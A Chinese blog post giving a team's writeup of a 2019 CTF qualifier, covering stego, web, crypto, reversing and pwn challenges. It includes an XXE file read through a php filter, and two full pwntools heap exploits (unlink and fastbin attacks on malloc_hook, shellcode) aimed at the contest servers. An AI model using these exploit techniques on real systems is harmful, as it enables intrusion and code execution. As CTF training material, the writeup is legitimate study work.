---
layout: post
title: Writeup | 网络与信息安全专项赛
tags: writeup
date: 2019-08-19 15:00:20
mathjax: true
---

第四届中国创新挑战赛暨中关村第三届新兴领域专题赛网络与信息安全专项赛线上初赛writeup

<!-- more -->

第四届中国创新挑战赛暨中关村第三届新兴领域专题赛网络与信息安全专项赛线上初赛已经结束。以下是协会小伙伴们的writeup，供各位学习参考。

## 0x00 签到题

{% asset_img 0x00.png %}

## 0x01 24word

拿到题目，zsteg 发现存在 zip

{% asset_img 0x01.png%}

foremost 提取，存在一个有密码的 zip 

{% asset_img 0x01-1.png %}

思路断了？开始搜社会主义核心价值观，然后找到了这个？ 

{% asset_img 0x01-2.png%}

解密后得到密码 

{% asset_img 0x01-3.png%}

解密后得到一个图片

{% asset_img 0x01-4.png%}

扫描二维码得到 flag 

{% asset_img 0x01-5.jpg%}



## 0x02 Game

查看源码

{% asset_img 0x02.png%}

尝试直接发送 post score=15 于 score.php 

Flag 出来了？ 

{% asset_img 0x02-1.png%}



## 0x03 七代目

{% asset_img 0x03.png%}

文件头错误，修改成 gif 

{% asset_img 0x03-1.png%}

根据 gif 出题思路，分解 gif 成帧 

{% asset_img 0x03-2.png%}

根据题目提示，七代目？第 7 帧，得到 flag

{% asset_img 0x03-3.png%}

## 0x04 whoareyou?

查看源码，显然 xxe

{% asset_img 0x04.png%}

{% asset_img 0x04-1.png%}

利用 php 伪协议读取 index.php 

{% asset_img 0x04-2.png%}

Base64 解码得到 flag 

{% asset_img 0x04-3.png%}

## 0x05 Yasaxi

用 010editor 解析 zip，发现最后一段解析错误 

{% asset_img 0x05.png%}

发现有 pass:loli，把这个删掉，然后对比正常的 zip 再微调一样，修复出来一个有密码的 zip 压缩包

密码就是 loli，然后 strings 一波，看到最后有一大串字符串，由 .!?问号组成 

一波搜索引擎，Ook!编码？

{% asset_img 0x05-1.png%}

解码得到 flag

 https://www.splitbrain.org/services/ook 

{% asset_img 0x05-n.png%}

## 0x06 one_string

这题比较简单，edit 函数会用 strlen 更新长度，然后就有 off by one，可以修改下一个 chunk 的 size 

通过布置堆块，有堆溢出，然后再用 unlink attack，就有任意写，之后写一下 malloc_hook 就行了

Payload 如下

```python
from pwn import *
import base64

debug=0

context.log_level='debug'
payload = ''

if debug:
    p=process('./pwn')
    #p=process('',env={'LD_PRELOAD':'./libc.so'})
    #gdb.attach(p)
else:
    p=remote('df0a72047d6c.gamectf.com', 10001)

def ru(x):
    return p.recvuntil(x)

def se(x):
    global payload
    payload+=x
    p.send(x)

def sl(x):
    global payload
    payload+=x+'\n'
    p.sendline(x)

def add(sz,content):
    sl('1')
    sl(str(sz))
    se(content)

def delete(idx):
    sl('2')
    sl(str(idx))

def edit(idx,content):
    sl('3')
    sl(str(idx))
    se(content)

if not debug:
    ru('Please input you token:\n')
    sl('icq68eb9ea8ac6b069c375a9faa1e91b')
    sss = 'MQoyNTIKYWFhCjEKMjUyCmFhYQoxCjI1MgphYWEKMQoyNTIKYmJiCjEKMjUyCmNjYwozCjAKYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhMwowCmFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQEDMgoxCjEKNzY0CmNjYwozCjIKYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhMwoyCmFhYWFhYWFhPLoOCEC6DghhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFh+AAAAAABMwoxCmFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQEBAAAAAAAAAAAACjIKMwozCjIK2KQOCNikDgjYpA4ITLoOCGpnaC9mbGGJ4zHJMdJqBVjNgGoBW4nBMdJo////f14xwLC7zYAKMwowCky6DggKMQo0MAo='
    ru('So, please give me a base64 strings:')
    sl(sss)

else:
    exit(0)

ru('You know all, Please input:\n')
add(0xfc,'aaa\n')
add(0xfc,'aaa\n')
add(0xfc,'aaa\n')
add(0xfc,'bbb\n')
add(0xfc,'ccc\n')

edit(0,'a'*0xfc)
edit(0,'a'*0xfc+'\1\3')
delete(1)
add(0x2fc,'ccc\n')

addr = 0x80eba48

edit(2,'a'*0xfc)
#edit(0,p32(0)+p32(0xf9)+p32(addr-0xc)+p32(addr-0x8)+'a'*0xe8+p32(0xf8)+'\0\1')
edit(2,'a'*8+p32(addr-0xc)+p32(addr-0x8)+'a'*0xe8+p32(0xf8)+'\0\1')

edit(1,'a'*0xfc+p32(0x101)+p32(0)+'\0\0\0\n')

delete(3)

edit(2,p32(0x80EA4D8)*3+p32(0x80eba4c)+asm(shellcraft.cat('/flag'))+'\n')
edit(0,p32(0x80eba4c)+'\n')
sl('1\n40')

print(base64.b64encode(payload))
p.interactive()

```

**FLAG: **

flag{e168a5c525ee683a5fa298dc8afdeadf}

## 0x07 two_string

这题漏洞在于create一个size为0的string，当这个string上面有遗留的内容的时候

可以利用merge_strings进行溢出

这里是改chunk size，然后堆溢出，再fastbin attack

Payload如下

```python
from pwn import *

debug=0

context.log_level='debug'

if debug:
    #p=process('./pwn')
    p=process('./pwn',env={'LD_PRELOAD':'./libc-2.24.so'})
    gdb.attach(p)
else:
    p=remote('a32f094e35d7.gamectf.com',20001)

def ru(x):
    return p.recvuntil(x,timeout=3)

def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

def add(sz,content):
    sl('1')
    ru('Please enter the size of string :')
    sl(str(sz))
    ru('Please enter the string :')
    se(content)
    ru('>>> ')

def show(idx):
    sl('2')
    ru('index :')
    sl(str(idx))

def delete(idx):
    sl('3')
    ru('index :')
    sl(str(idx))
    ru('>>> ')

def merge(idx1,idx2):
    sl('4')
    ru('index :')
    sl(str(idx1))
    ru('index :')
    sl(str(idx2))
    ru('>>> ')    


def merges(idxs):
    sl('5')
    ru('strings to be merged : ')
    sl(idxs)
    ru('>>> ')

add(0xa8,'aaa\n')
add(0xa8,'aaa\n')
delete(0)
sl('1')
ru('Please enter the size of string :')
sl('0')
ru('>>> ')

sl('1')
ru('Please enter the size of string :')
sl('0')
ru('>>> ')

show(2)
ru('are : ')

libc = u64(ru('\n')[:-1]+'\0\0')
base = libc-0x3c1b58
ru('>>> ')

#clear
add(0x500,'aaa\n')

delete(0)
delete(1)
delete(2)
delete(3)

#leak heap
add(0x38,cyclic(0x38))
add(0x48,'aaa\n')
sl('1')
ru('Please enter the size of string :')
sl('0')
ru('>>> ')
show(2)
ru('are : ')

heap = u64(ru('\n')[:-1]+'\0\0')-0x80
ru('>>> ')

#clear

delete(0)
delete(1)
delete(2)
add(0x500,'aaa\n')

#attack
add(0x78,'a\n') #1
add(0x18,'b'*0x18) #2
delete(1)
add(0x408,'a\n') #1
add(0xf8,'b\n') #3
add(0x68,'c\n') #4
add(0x400,'a'*0x400) #5

sl('1')
ru('Please enter the size of string :')
sl('0')
ru('>>> ') #6

add(7,'aaa\x71\x01\n') #7

delete(1)

merges('5 6 7') #attack success

delete(3)

delete(4)

malloc_hook = base + 0x3c1af0

add(0x168,'a'*0xf8+p64(0x71)+p64(malloc_hook-0x23)+'\n')

add(0x68,'aa\n')
add(0x68,'a'*11+p64(base+0x455aa)+p64(base+0x86F70)+'\n')


print(hex(base))
print(hex(heap))
p.interactive()
```

**FLAG:**

{% asset_img 0x07.png%}

## 0x08 flat

这题是用qira做的

{% asset_img 0x08.png %}

跟踪到check5，看到内存中有一串内容

观察一波规律

可以写出下面的脚本拿到flag

```python
flag = ''
for i in encode:
    if ord(i)-17 <=ord('9') and ord(i)-17 >= ord('0'):
        flag += chr(ord(i)-17)
    elif i =='-':
        flag += '-'
    else:
        flag += chr(ord(i)+48)
print(flag)

```

**FLAG:**

flag{9bbfa2fc-c8b8-464d-8122-84da0e8e5d71}

## 0x09 src_leak

源码都直接给出来了

_func1: 平方根

func2: 二进制中1的个数

func3: 判断是否为奇数

func4: 判断是否为素数

根据题意，x1-x5分别为963，4396，6666，1999，3141的平方，即927369，19324816，44435556，3996001，9865881。而1到10000的整数中共有1229个素数，即x6=1229。

**FLAG:**

flag{927369-19324816-44435556-3996001-9865881-1229}

## 0x0A sm4

调库

```python
from gmssl.sm4 import CryptSM4, SM4_DECRYPT

key = [13, 204, 99, 177, 254, 41, 198, 163, 201, 226, 56, 214, 192, 194, 98, 104]
c = [46, 48, 220, 156, 184, 218, 57, 13, 246, 91, 1, 63, 60, 67, 105, 64, 149, 240, 217, 77, 107, 49, 222, 61, 155, 225, 231, 196, 167, 121, 9, 16, 60, 182, 65, 101, 39, 253, 250, 224, 9, 204, 154, 122, 206, 43, 97, 59]

crypt_sm4 = CryptSM4()
crypt_sm4.set_key(key, SM4_DECRYPT)
crypt_sm4.mode=2
m = crypt_sm4.crypt_ecb(c)
print(m.decode())

```

**FLAG:**

flag{1caa96be-4266-4a8e-bd2c-ece977495497}



## 0x0B dp

给了e，n，dp，求p，q
$$
ed \equiv 1 \pmod {\phi(n)}\\
dp \equiv d \pmod {(p-1)}
$$
所以
$$
ed = k_1\phi(n)+1 = k_1(p-1)(q-1)+1\\
dp = k_2(p-1)+d
$$
所以
$$
dp \times e = ek_2(p-1)+k_1(p-1)(q-1)+1
$$
即
$$
dp \times e -1 = (p-1)(ek_2+k_1(q-1))
$$
显然
$$
dp < p-1
$$
所以
$$
(ek_2+k_1(q-1))
$$
不会比e大。注意到e也不大，可以枚举
$$
(ek_2+k_1(q-1))
$$
求出可能的p，q，若p整除n，则q=n/p

```python
import gmpy2, libnum

e=65537
n=9637571466652899741848142654451413405801976834328667418509217149503238513830870985353918314633160277580591819016181785300521866901536670666234046521697590230079161867282389124998093526637796571100147052430445089605759722456767679930869250538932528092292071024877213105462554819256136145385237821098127348787416199401770954567019811050508888349297579329222552491826770225583983899834347983888473219771888063393354348613119521862989609112706536794212028369088219375364362615622092005578099889045473175051574207130932430162265994221914833343534531743589037146933738549770365029230545884239551015472122598634133661853901
dp=81339405704902517676022188908547543689627829453799865550091494842725439570571310071337729038516525539158092247771184675844795891671744082925462138427070614848951224652874430072917346702280925974595608822751382808802457160317381440319175601623719969138918927272712366710634393379149593082774688540571485214097
c=5971372776574706905158546698157178098706187597204981662036310534369575915776950962893790809274833462545672702278129839887482283641996814437707885716134279091994238891294614019371247451378504745748882207694219990495603397913371579808848136183106703158532870472345648247817132700604598385677497138485776569096958910782582696229046024695529762572289705021673895852985396416704278321332667281973074372362761992335826576550161390158761314769544548809326036026461123102509831887999493584436939086255411387879202594399181211724444617225689922628790388129032022982596393215038044861544602046137258904612792518629229736324827

tmp = e * dp - 1
for i in range(1, e):
	if tmp % i == 0:
		if n % (tmp // i + 1) == 0:
			p = tmp // i + 1
			q = n // p
			phi = (p - 1) * (q - 1)
			d = gmpy2.invert(e, phi)
			m = pow(c, d, n)
			print(libnum.n2s(m))

```

**FLAG:**

flag{c3009b61-f9ed-4b20-8855-edab53e89530}